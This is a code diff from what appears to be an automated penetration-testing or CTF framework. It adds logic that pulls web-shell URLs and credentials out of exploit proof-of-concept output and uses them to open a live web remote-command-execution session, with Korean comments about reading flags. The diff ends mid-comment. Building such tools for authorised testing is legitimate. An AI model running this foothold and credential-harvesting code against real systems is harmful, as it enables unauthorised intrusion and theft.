@@ -52,10 +52,34 @@ class FootholdMixin:
                 return
             before = len(report.enum_findings)
             self._attempt(report, report.enum_findings, poc, phase="access")
-            from .exploit_run import harvest_creds
+            from .exploit_run import harvest_creds, harvest_foothold
+            mod = getattr(self, "_active_exploit_module", None)
             for f in report.enum_findings[before:]:
-                for u, p in harvest_creds(f.output or ""):
+                out = f.output or ""
+                for u, p in harvest_creds(out):
                     self.world.add_cred(f"{u}:{p}", source="PoC 출력")
+                # 발판 아티팩트 캡처: PoC 가 드롭한 웹셸 URL 을 잡아 웹 RCE 발판으로 잇는다.
+                # (한 번 잡으면 유지 — 이후 _acquire_web_rce 가 이 URL/스펙으로 세션 획득.)
+                if not getattr(self, "rce_url", ""):
+                    url = harvest_foothold(out, mod)
+                    if url:
+                        self._set_web_rce_from_capture(url, mod, report)
+
+    def _set_web_rce_from_capture(self, url, module, report):
+        """캡처한 웹셸 URL 로 웹 RCE 발판 스펙을 세팅한다(생성 전용 — 세션 획득은 _acquire_web_rce).
+        모듈이 있으면 그 cmd 스펙(param/method/inject)을, 없으면 보수적 기본(cmd/GET/query)을 쓴다."""
+        self.rce_url = url
+        if module is not None:
+            self.rce_cmd_param = module.cmd_param
+            self.rce_method = module.cmd_method
+            self.rce_inject = module.cmd_inject
+        else:
+            self.rce_cmd_param, self.rce_method, self.rce_inject = "cmd", "GET", "query"
+        self.audit.event("foothold_url_captured", url=url,
+                         via=(module.cve if module is not None else "generic"))
+        report.manual_suggestions.append(
+            f"# 웹 RCE 발판 캡처 — PoC 출력에서 웹셸 URL 확보: {url} "
+            f"(cmd 파라미터='{self.rce_cmd_param}', {self.rce_method}). 이 채널로 명령 실행·플래그 읽기.")
 
     def _exploit_exec_stage(self, report, host):
         if not self.exploit_exec or self.world is None or self.dry_run:
@@ -178,7 +202,11 @@ class FootholdMixin:
                 "발판 미확보로 안전하게 건너뜀(실행 크래시 아님).")
             return None
         url = getattr(self, "rce_url", None) or f"https://{self.world.target}/admin/config.php"
-        ws = WebRceSession(url, "cmd", method="POST", inject="body")
+        # 캡처된 발판이면 그 cmd 스펙(param/method/inject)을 쓰고, 아니면 보수적 기본(POST/body).
+        param = getattr(self, "rce_cmd_param", "") or "cmd"
+        method = getattr(self, "rce_method", "") or "POST"
+        inject = getattr(self, "rce_inject", "") or "body"
+        ws = WebRceSession(url, param, method=method, inject=inject)
         ws.attach(web_http_fn)                       # ← 실제 HTTP (표면)
         # ★ 성립 검증: id/uname 신호가 없으면 헛발판 → 폐기(거짓 '발판 확보' 방지). HTTP 요청
         # 자체가 런타임에 실패(연결거부·타임아웃·TLS)하면 '발판 미확보'로 degrade 해 None 을
